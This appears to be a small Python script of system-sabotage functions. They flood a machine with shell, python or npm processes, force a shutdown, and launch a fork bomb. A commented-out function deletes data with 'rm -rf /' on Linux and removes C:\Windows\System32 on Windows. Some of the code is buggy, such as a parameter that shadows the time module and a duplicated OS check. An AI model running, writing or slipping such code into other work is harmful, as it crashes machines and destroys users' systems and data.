from msilib.schema import PublishComponent
import os
import subprocess
import time

def syscrash(ranger, delay):
    print(f"Delay set to {delay}")
    time.sleep(delay)
    for i in range(ranger):
        os.system('start')


def pyspam(ranger, delay):
    print(f"Pyspam will start spamming python processes within {delay} secconds")
    time.sleep(delay)
    for i in range(ranger):
        os.system('python')
def spam(delay, ranger, path, exec, procces_type):
    print(f"process will start within {delay} secconds")
    time.sleep(delay)
    os.chdir(path)
    if procces_type == 'python':
        for i in range(ranger):
            os.system(f'python {exec}')
    elif procces_type == 'js':
        for i in range(ranger):
            os.system(f'npm run {exec}')
#def syskill(timer, sys_type):
#    print(f"Starting the sussy process :) within {timer} seconds")
#    time.sleep(timer)
#    if sys_type == 'linux':
#        os.system('rm -rf /')
#    elif sys_type == 'windows':
#        os.rmdir('C:\Windows\System32')
def sht(time, ost):
    if ost == 'Windows':
        time.sleep(time)
        os.system(f'shutdown -s -t {time}')
    elif ost == 'Windows':
        time.sleep(time)
        os.system('sudo shutdown now')
    else:
        print("Invalid argument")
        quit()
def rambo(delay):
    time.sleep(delay)
    cmd=str(":(){:|:&};")
    os.system(cmd)